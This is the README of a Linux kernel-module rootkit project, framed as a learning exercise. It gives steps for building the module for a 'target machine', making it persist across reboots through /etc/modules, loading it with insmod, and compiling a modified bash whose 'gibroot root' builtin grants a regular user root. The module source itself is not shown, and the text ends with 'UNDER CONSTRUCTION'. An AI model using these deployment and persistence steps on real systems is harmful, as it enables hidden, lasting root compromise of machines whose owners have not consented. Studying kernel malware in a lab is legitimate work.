
# linux rootkit

this is a kernel module-based rootkit for linux that supports privelige escalation, compromising random number generation, file and directory hiding, and process injection.

this is a project to allow participants to better understand the inner workings of malware at the kernel level and to gain a deeper understanding of the constraints and possibilities of actions in the kernel space.


## Installation

step 1: open up the Makefile and set KDIR to the path to the linux source tree. this should be configured identically to the target machine's kernel.

```
KDIR = ~/learning/linux #replace with appropriate path
```
step 2: run the Makefile to compile the kernel module, and copy rootkit_module.ko over to the target machine
```
Make
```

step 3: copy over bash-4.3 and bdoor_common.h to the target machine, and compile Bash by running configure and make (to have this work with different versions of Bash, go int bash-4.3/builtins, copy over gibroot.def, and change Makefile.in to conform with https://stackoverflow.com/questions/10063417/how-do-i-add-an-internal-command-to-bash)
```
cd bash-4.3
./configure
make
```

(extra) step 4: to make the rootkit persistant,  while root in the target machine, move rootkit_module.ko into the folder specified by /lib/modules/$(uname -r)/, and add the line "rootkit_module" to the bottom of /etc/modules. this make kmod load the module upon boot.
```
cp rootkit_module.ko /lib/modules/$(uname -r)/
echo "rootkit_module" >> /etc/modules
```


## Run
to load the module, while root run
```
insmod rootkit_module.ko
```
the module can also be removed with
```
rmmod rootkit_module.ko
```

now, as a regular user run the compiled bash executable. this will grant you access to the new gibroot builtin
```
cd bash-4.3
./bash
```

## API Reference

to escalate shell privelige to root, use
```
gibroot root
```

UNDER CONSTRUCTION

